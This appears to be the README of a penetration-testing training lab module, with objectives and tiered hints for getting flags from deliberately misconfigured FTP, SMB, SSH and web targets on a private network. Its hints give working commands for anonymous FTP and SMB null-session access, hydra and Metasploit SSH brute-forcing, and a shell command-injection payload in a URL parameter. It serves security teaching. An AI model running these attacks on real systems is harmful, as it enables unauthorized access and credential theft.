# 03-services — Network service exploitation

## Objectives

1. Read the anonymous FTP flag.
2. Read the SMB null-session flag.
3. Crack the SSH password with hydra **and** open a Metasploit session.
4. Get RCE on the web `ping` page and read `/flag.txt`.

## Setup

```bash
./lab up 03-services
./lab shell
```

Targets (reachable only from inside the attacker box, on
`172.28.0.0/24`):

- FTP: `172.28.0.30`
- SMB: `172.28.0.31`
- SSH: `172.28.0.32` (user `svc`)
- Web: `172.28.0.33`

## Hints

<details><summary>Hint 1 — FTP &amp; SMB</summary>Both of these services can be misconfigured to allow access with no real credentials at all. Try connecting to each without a password and see what you can list or read.</details>

<details><summary>Hint 2 — FTP &amp; SMB</summary>Use <code>curl ftp://</code> with the well-known anonymous FTP credentials, and <code>smbclient -N</code> (the <code>-N</code> flag suppresses the password prompt for a null session) against the SMB share.</details>

<details><summary>Hint 3 — FTP &amp; SMB</summary>

```bash
curl ftp://172.28.0.30/pub/flag.txt --user anonymous:anon
smbclient -N -L //172.28.0.31
smbclient //172.28.0.31/public -N -c 'get flag.txt'
```

</details>

<details><summary>Hint 1 — SSH</summary>The <code>svc</code> account uses a weak, guessable password. Brute-force it with a small candidate list, then prove you can actually use the credential two different ways.</details>

<details><summary>Hint 2 — SSH</summary><code>hydra ... ssh://</code> for the password-guessing attack. For the "session" checkpoint, Metasploit's <code>auxiliary/scanner/ssh/ssh_login</code> module does the same login but hands you back a trackable session object instead of just a printed credential.</details>

<details><summary>Hint 3 — SSH</summary>

```bash
hydra -l svc -P /usr/share/wordlists/rockyou.txt -f ssh://172.28.0.32
ssh svc@172.28.0.32   # password from hydra

msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; \
  set USERNAME svc; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; sessions -l; exit'
```

</details>

<details><summary>Hint 1 — Web</summary>The web page takes a host/IP and pings it for you. Think about what happens if you can sneak extra characters into that parameter that mean something to a shell.</details>

<details><summary>Hint 2 — Web</summary>Inspect the <code>host</code> query parameter on <code>cmd.php</code>. Shell metacharacters like <code>;</code> let you chain a second command onto the intended <code>ping</code> call.</details>

<details><summary>Hint 3 — Web</summary>

```bash
curl 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat /flag.txt'
```

</details>

## Checkpoint

- `FTP-FLAG{...}` retrieved from the FTP server.
- `SMB-FLAG{...}` retrieved from the SMB share.
- The SSH password cracked with hydra, **and** a Metasploit `ssh_login`
  session opened against the same host.
- `WEB-FLAG{...}` retrieved via command injection on the web `ping` page.
